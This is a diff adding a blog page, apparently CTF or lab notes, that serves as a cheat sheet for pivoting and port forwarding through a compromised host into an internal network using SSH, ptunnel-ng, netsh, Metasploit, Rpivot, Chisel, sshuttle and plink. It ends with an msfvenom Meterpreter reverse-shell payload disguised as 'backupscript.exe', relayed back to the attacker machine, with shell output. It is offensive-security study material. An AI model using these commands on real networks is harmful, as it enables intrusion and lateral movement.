@@ -1,0 +1,296 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Pivoting And Port Forwarding | Twistzz</title><meta name="author" content="Twistzz"><meta name="copyright" content="Twistzz"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="n &#x3D; Our Attacker Machine n+1 &#x3D; Pivot Machine n+2 &#x3D; Internal Machine Local Port ForwardingSSH (n)Forward a Single Port 1ssh -L local_port:localhost:remote_port username@n+1  Forward Mult">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Pivoting And Port Forwarding">
+<meta property="og:url" content="https://twistzz-ctf.github.io/2025/11/22/Pivoting-And-Port-Forwarding/index.html">
+<meta property="og:site_name" content="Twistzz">
+<meta property="og:description" content="n &#x3D; Our Attacker Machine n+1 &#x3D; Pivot Machine n+2 &#x3D; Internal Machine Local Port ForwardingSSH (n)Forward a Single Port 1ssh -L local_port:localhost:remote_port username@n+1  Forward Mult">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://twistzz-ctf.github.io/images/avatar.png">
+<meta property="article:published_time" content="2025-11-22T18:45:35.000Z">
+<meta property="article:modified_time" content="2026-08-18T23:24:51.850Z">
+<meta property="article:author" content="Twistzz">
+<meta property="article:tag" content="Chisel">
+<meta property="article:tag" content="Dynamic-Port-Forwarding">
+<meta property="article:tag" content="Local-Port-Forwarding">
+<meta property="article:tag" content="Proxifier">
+<meta property="article:tag" content="Proxychains">
+<meta property="article:tag" content="Reverse-Port-Forwarding">
+<meta property="article:tag" content="Rpivot">
+<meta property="article:tag" content="plink">
+<meta property="article:tag" content="socat">
+<meta property="article:tag" content="sshuttle">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://twistzz-ctf.github.io/images/avatar.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Pivoting And Port Forwarding",
+  "url": "https://twistzz-ctf.github.io/2025/11/22/Pivoting-And-Port-Forwarding/",
+  "image": "https://twistzz-ctf.github.io/images/avatar.png",
+  "datePublished": "2025-11-22T18:45:35.000Z",
+  "dateModified": "2026-08-18T23:24:51.850Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Twistzz",
+      "url": "https://twistzz-ctf.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/images/favicon.ico"><link rel="canonical" href="https://twistzz-ctf.github.io/2025/11/22/Pivoting-And-Port-Forwarding/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.2"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"pagination":{"enable":false,"hitsPerPage":8},"languages":{"hits_empty":"No results found for: ${query}","hits_stats":"${hits} articles found"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Failed',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Pivoting And Port Forwarding',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><link rel="stylesheet" href="/css/custom.css"><meta name="generator" content="Hexo 8.1.2"></head><body><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/images/avatar.png" alt="Logo"><span class="site-name">Twistzz</span></a><a class="nav-page-title" href="/"><span class="site-name">Pivoting And Port Forwarding</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  Back to Home</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> Search</span></span></div></div></nav><div id="post-info"><h1 class="post-title">Pivoting And Port Forwarding</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2025-11-22T18:45:35.000Z" title="Created 2025-11-22 19:45:35">2025-11-22</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2026-08-18T23:24:51.850Z" title="Updated 2026-08-19 00:24:51">2026-08-19</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Active-Directory/">Active Directory</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Active-Directory/Linux/">Linux</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Active-Directory/Linux/Pivoting-And-Port-Forwarding/">Pivoting And Port Forwarding</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><p>n &#x3D; Our Attacker Machine</p>
+<p>n+1 &#x3D; Pivot Machine</p>
+<p>n+2 &#x3D; Internal Machine</p>
+<h1 id="Local-Port-Forwarding"><a href="#Local-Port-Forwarding" class="headerlink" title="Local Port Forwarding"></a>Local Port Forwarding</h1><h2 id="SSH-n"><a href="#SSH-n" class="headerlink" title="SSH (n)"></a>SSH (n)</h2><p>Forward a Single Port</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -L local_port:localhost:remote_port username@n+1</span><br></pre></td></tr></table></figure>
+
+<p>Forward Multiple Ports (n)</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -L local_port:localhost:remote_port -L local_port:localhost:remote_port username@n+1</span><br></pre></td></tr></table></figure>
+
+<h1 id="Port-Forwarding"><a href="#Port-Forwarding" class="headerlink" title="Port Forwarding"></a>Port Forwarding</h1><h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><h3 id="meterpreter-n"><a href="#meterpreter-n" class="headerlink" title="meterpreter (n)"></a>meterpreter (n)</h3><p>➜ Requires an active Meterpreter session</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; portfwd add -l Local-proxy-port -p remote-port -r n+2</span><br></pre></td></tr></table></figure>
+
+<p>Example</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xfreerdp /v:localhost:Local-proxy-port /u:username /p:password</span><br></pre></td></tr></table></figure>
+
+<h3 id="ptunnel-ng"><a href="#ptunnel-ng" class="headerlink" title="ptunnel-ng"></a>ptunnel-ng</h3><h5 id="Server-Side-n-1"><a href="#Server-Side-n-1" class="headerlink" title="Server Side ( n+1 )"></a>Server Side ( n+1 )</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> ./ptunnel-ng -r &lt;target-ip (n+1 or n+2)&gt; -R &lt;target-port&gt;</span><br></pre></td></tr></table></figure>
+
+<h5 id="Client-Side-n"><a href="#Client-Side-n" class="headerlink" title="Client Side ( n )"></a>Client Side ( n )</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> ./ptunnel-ng -p &lt;pivot-ip (n+1)&gt; -l &lt;local-proxy-port&gt; -r &lt;target-ip&gt; -R &lt;target-port&gt;</span><br></pre></td></tr></table></figure>
+
+<p>➜ If we forward SSH, we can then use it for dynamic port forwarding.</p>
+<h5 id="Example-Port-forward-SSH"><a href="#Example-Port-forward-SSH" class="headerlink" title="Example : Port forward SSH"></a>Example : Port forward SSH</h5><h6 id="Server-Side-n-1-1"><a href="#Server-Side-n-1-1" class="headerlink" title="Server Side ( n+1 )"></a>Server Side ( n+1 )</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> ./ptunnel-ng -r10.129.202.64 -R22</span><br></pre></td></tr></table></figure>
+
+<h6 id="Client-Side-n-1"><a href="#Client-Side-n-1" class="headerlink" title="Client Side ( n )"></a>Client Side ( n )</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22</span><br></pre></td></tr></table></figure>
+
+<h6 id="Connect-to-the-target-port"><a href="#Connect-to-the-target-port" class="headerlink" title="Connect to the target port"></a>Connect to the target port</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -p2222 -lubuntu 127.0.0.1</span><br></pre></td></tr></table></figure>
+
+<p>Dynamic Port Forwarding over SSH</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -D 9050 -p2222 -lubuntu 127.0.0.1</span><br></pre></td></tr></table></figure>
+
+<h5 id="Example-Port-forward-RDP"><a href="#Example-Port-forward-RDP" class="headerlink" title="Example : Port forward RDP"></a>Example : Port forward RDP</h5><h6 id="Client-Side-n-2"><a href="#Client-Side-n-2" class="headerlink" title="Client Side ( n )"></a>Client Side ( n )</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> ./src/ptunnel-ng -p10.129.202.64 -l 2222 -r172.16.5.19 -R3389</span><br></pre></td></tr></table></figure>
+
+<h6 id="Server-Side-n-1-2"><a href="#Server-Side-n-1-2" class="headerlink" title="Server Side ( n+1 )"></a>Server Side ( n+1 )</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> ./ptunnel-ng -r172.16.5.19 -R3389</span><br></pre></td></tr></table></figure>
+
+<h6 id="Connect-RDP"><a href="#Connect-RDP" class="headerlink" title="Connect RDP"></a>Connect RDP</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xfreerdp /v:localhost:2222 /u:victor /p:<span class="string">&#x27;pass@123&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><h3 id="Netsh-n-1"><a href="#Netsh-n-1" class="headerlink" title="Netsh (n+1)"></a>Netsh (n+1)</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Windows</span>\<span class="title">system32</span>&gt; <span class="title">netsh.exe</span> <span class="title">interface</span> <span class="title">portproxy</span> <span class="title">add</span> <span class="title">v4tov4</span> <span class="title">listenport</span>=<span class="title">Listener</span>-<span class="title">port</span>-<span class="title">on</span>-<span class="title">n</span>+1 <span class="title">listenaddress</span>=<span class="title">n</span>+1 <span class="title">connectport</span>=<span class="title">remote</span>-<span class="title">port</span>-<span class="title">on</span>-<span class="title">n</span>+2 <span class="title">connectaddress</span>=<span class="title">n</span>+2</span></span><br></pre></td></tr></table></figure>
+
+<p>Example</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Windows</span>\<span class="title">system32</span>&gt;<span class="title">netsh</span> <span class="title">interface</span> <span class="title">portproxy</span> <span class="title">add</span> <span class="title">v4tov4</span> <span class="title">listenport</span>=8080 <span class="title">listenaddress</span>=10.129.42.198 <span class="title">connectport</span>=3389 <span class="title">connectaddress</span>=172.16.5.19</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Windows</span>\<span class="title">system32</span>&gt;<span class="title">netsh.exe</span> <span class="title">interface</span> <span class="title">portproxy</span> <span class="title">show</span> <span class="title">v4tov4</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Listen</span> <span class="title">on</span> <span class="title">ipv4</span>:             <span class="title">Connect</span> <span class="title">to</span> <span class="title">ipv4</span>:</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Address</span>         <span class="title">Port</span>        <span class="title">Address</span>         <span class="title">Port</span></span></span><br><span class="line"><span class="function">--------------- ----------  --------------- ----------</span></span><br><span class="line"><span class="function">10.129.42.198   8080        172.16.5.19     3389</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xfreerdp /v:10.129.42.198:8080 /u:victor /p:<span class="string">&#x27;pass@123&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="Dynamic-Port-Forwarding"><a href="#Dynamic-Port-Forwarding" class="headerlink" title="Dynamic Port Forwarding"></a>Dynamic Port Forwarding</h1><h2 id="Linux-1"><a href="#Linux-1" class="headerlink" title="Linux"></a>Linux</h2><h3 id="Using-Proxychains"><a href="#Using-Proxychains" class="headerlink" title="Using Proxychains"></a>Using Proxychains</h3><h4 id="SSH-n-1"><a href="#SSH-n-1" class="headerlink" title="SSH (n)"></a>SSH (n)</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -D Local-proxy-port username@n+1</span><br></pre></td></tr></table></figure>
+
+<h4 id="Meterpreter-n"><a href="#Meterpreter-n" class="headerlink" title="Meterpreter (n)"></a>Meterpreter (n)</h4><p><strong>➜ Requires an active Meterpreter session</strong></p>
+<h5 id="Start-the-SOCKS-Proxy"><a href="#Start-the-SOCKS-Proxy" class="headerlink" title="Start the SOCKS Proxy"></a>Start the SOCKS Proxy</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use auxiliary/server/socks_proxy</span><br><span class="line"></span><br><span class="line">msf6 auxiliary(server/socks_proxy) &gt; <span class="built_in">set</span> SRVPORT Local-proxy-port</span><br><span class="line">msf6 auxiliary(server/socks_proxy) &gt; <span class="built_in">set</span> SRVHOST 0.0.0.0</span><br><span class="line">msf6 auxiliary(server/socks_proxy) &gt; <span class="built_in">set</span> version 4a</span><br><span class="line">msf6 auxiliary(server/socks_proxy) &gt; run</span><br></pre></td></tr></table></figure>
+
+<h5 id="Add-Route-to-internal-network"><a href="#Add-Route-to-internal-network" class="headerlink" title="Add Route to internal_network"></a>Add Route to internal_network</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use post/multi/manage/autoroute</span><br><span class="line"></span><br><span class="line">msf6 post(multi/manage/autoroute) &gt; <span class="built_in">set</span> SESSION &lt;<span class="built_in">id</span>&gt;</span><br><span class="line">msf6 post(multi/manage/autoroute) &gt; <span class="built_in">set</span> SUBNET internal_network_@</span><br><span class="line">msf6 post(multi/manage/autoroute) &gt; run</span><br></pre></td></tr></table></figure>
+
+<pre><code>or
+</code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run autoroute -s internal_network_@/mask</span><br></pre></td></tr></table></figure>
+
+<h4 id="Rpivot"><a href="#Rpivot" class="headerlink" title="Rpivot"></a>Rpivot</h4><h5 id="Server-attacker-machine-n"><a href="#Server-attacker-machine-n" class="headerlink" title="Server (attacker machine - n)"></a>Server (attacker machine - n)</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2.7 server.py --proxy-port Local-proxy-port --server-port Listener-port --server-ip 0.0.0.0</span><br></pre></td></tr></table></figure>
+
+<h5 id="Client-pivot-machine-n-1"><a href="#Client-pivot-machine-n-1" class="headerlink" title="Client (pivot machine - n+1)"></a>Client (pivot machine - n+1)</h5><p>Transfer rpivot to n+1 machine:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp -r rpivot username@n+1:/home/username/</span><br></pre></td></tr></table></figure>
+
+<p>Run client:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2.7 client.py --server-ip n --server-port Listener-port</span><br></pre></td></tr></table></figure>
+
+<p>Then</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains firefox-esr 172.16.5.135:80</span><br></pre></td></tr></table></figure>
+
+<p>or</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains curl http://172.16.5.135/</span><br></pre></td></tr></table></figure>
+
+<h4 id="Chisel"><a href="#Chisel" class="headerlink" title="Chisel"></a>Chisel</h4><p>Transfer chisel to n+1 machine:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp -r chisel username@n+1:/home/username/</span><br></pre></td></tr></table></figure>
+
+<p>Server ( n+1 )</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./chisel server -v -p listener-port --socks5</span><br></pre></td></tr></table></figure>
+
+<p>Client ( n )</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./chisel client -v machine-n+1:listener-port socks</span><br></pre></td></tr></table></figure>
+
+<p>➜ We should use <code>socks5 127.0.0.1 1080</code> in &#x2F;etc&#x2F;proxychains.conf.</p>
+<h4 id="Chisel-Reverse-Pivot"><a href="#Chisel-Reverse-Pivot" class="headerlink" title="Chisel Reverse Pivot"></a>Chisel Reverse Pivot</h4><p>Server ( n )</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> ./chisel server --reverse -v -p listening-port --socks5</span><br></pre></td></tr></table></figure>
+
+<p>Transfer chisel to n+1 machine:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp -r chisel username@n+1:/home/username/</span><br></pre></td></tr></table></figure>
+
+<p>Client ( n+1 )</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./chisel client -v machine-n:listening-port R:socks</span><br></pre></td></tr></table></figure>
+
+<p>➜ We should use <code>socks5 127.0.0.1 1080</code> in &#x2F;etc&#x2F;proxychains.conf.</p>
+<h4 id="Configure-Proxychains-n"><a href="#Configure-Proxychains-n" class="headerlink" title="Configure Proxychains (n)"></a>Configure Proxychains (n)</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/proxychains.conf</span><br><span class="line"></span><br><span class="line">socks4 127.0.0.1 Local-proxy-port</span><br></pre></td></tr></table></figure>
+
+<h3 id="Without-Proxychains"><a href="#Without-Proxychains" class="headerlink" title="Without Proxychains"></a>Without Proxychains</h3><h4 id="sshuttle-n"><a href="#sshuttle-n" class="headerlink" title="sshuttle (n)"></a>sshuttle (n)</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> sshuttle -r username@n+1 internal_network_@/mask -v</span><br></pre></td></tr></table></figure>
+
+<p>➜ Automatically handles traffic forwarding without needing Proxychains.</p>
+<p>➜ Works <em>only</em> for SSH-based pivoting (no TOR&#x2F;HTTPS proxy support).</p>
+<p>Example</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xfreerdp /v:172.16.5.19 /u:victor /p:<span class="string">&#x27;pass@123&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Windows-1"><a href="#Windows-1" class="headerlink" title="Windows"></a>Windows</h2><h4 id="plink-exe-n"><a href="#plink-exe-n" class="headerlink" title="plink.exe (n)"></a>plink.exe (n)</h4><h5 id="SSH-Dynamic-SOCKS-Proxy"><a href="#SSH-Dynamic-SOCKS-Proxy" class="headerlink" title="SSH Dynamic SOCKS Proxy"></a>SSH Dynamic SOCKS Proxy</h5><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">plink -ssh -D Local-proxy-port username@n+<span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="Proxy-Handling-Windows"><a href="#Proxy-Handling-Windows" class="headerlink" title="Proxy Handling (Windows)"></a>Proxy Handling (Windows)</h5><p>Use <strong>Proxifier</strong> to route selected tools through the proxy:</p>
+<p><img src="/img/proxifier.png" alt="Proxifier"></p>
+<p>➜ After configuration, any selected tool will have its traffic forwarded automatically.</p>
+<h1 id="Reverse-Port-Forwarding-Reverse-Bind-Shell"><a href="#Reverse-Port-Forwarding-Reverse-Bind-Shell" class="headerlink" title="Reverse Port Forwarding ( Reverse &#x2F; Bind Shell )"></a>Reverse Port Forwarding ( Reverse &#x2F; Bind Shell )</h1><h2 id="Reverse-Shell"><a href="#Reverse-Shell" class="headerlink" title="Reverse Shell"></a>Reverse Shell</h2><h3 id="Reverse-Shell-Preparation-Payload-Listener-Setup"><a href="#Reverse-Shell-Preparation-Payload-Listener-Setup" class="headerlink" title="Reverse Shell Preparation (Payload + Listener Setup)"></a>Reverse Shell Preparation (Payload + Listener Setup)</h3><p>Create Reverse Shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_https lhost=&lt;InternalIPofPivotHost&gt; -f exe -o backupscript.exe LPORT=&lt;Internal-listener-Port-on-n+1&gt;</span><br></pre></td></tr></table></figure>
+
+<p>Configuring &amp; Starting multi&#x2F;handler</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> LPORT &lt;listener-Port-on-n&gt;</span><br><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> LHOST 0.0.0.0</span><br><span class="line">msf6 exploit(multi/handler) &gt; run</span><br></pre></td></tr></table></figure>
+
+<h3 id="Creating-the-Reverse-Port-Forwarding-Tunnel-n-1-→-n"><a href="#Creating-the-Reverse-Port-Forwarding-Tunnel-n-1-→-n" class="headerlink" title="Creating the Reverse Port Forwarding Tunnel ( n+1 → n )"></a>Creating the Reverse Port Forwarding Tunnel ( n+1 → n )</h3><h4 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -R Internal-IP-of-PivotHost-n+1:&lt;Internal-listener-Port-on-n+1&gt;:0.0.0.0:&lt;listener-Port-on-n&gt; username@n+1 -vN</span><br></pre></td></tr></table></figure>
+
+<h4 id="meterpreter"><a href="#meterpreter" class="headerlink" title="meterpreter"></a>meterpreter</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; portfwd add -R -l &lt;listener-Port-on-n&gt; -p &lt;Internal-listener-Port-on-n+1&gt; -L IP-of-n-machine</span><br></pre></td></tr></table></figure>
+
+<h4 id="Socat"><a href="#Socat" class="headerlink" title="Socat"></a>Socat</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat TCP4-LISTEN:&lt;Internal-listener-Port-on-n+1&gt;,fork TCP4:IP-of-n-machine:&lt;listener-Port-on-n&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Execute-Reverse-Shell"><a href="#Execute-Reverse-Shell" class="headerlink" title="Execute Reverse Shell"></a>Execute Reverse Shell</h3><p>Once you execute <code>backupscript.exe</code> on Windows (n+2), we receive a shell from Windows pivoted via the Ubuntu server :</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 2336 created.</span><br><span class="line">Channel 1 created.</span><br><span class="line">Microsoft Windows [Version 10.0.17763.1637]</span><br><span class="line">(c) 2018 Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\&gt;</span><br></pre></td></tr></table></figure>
+
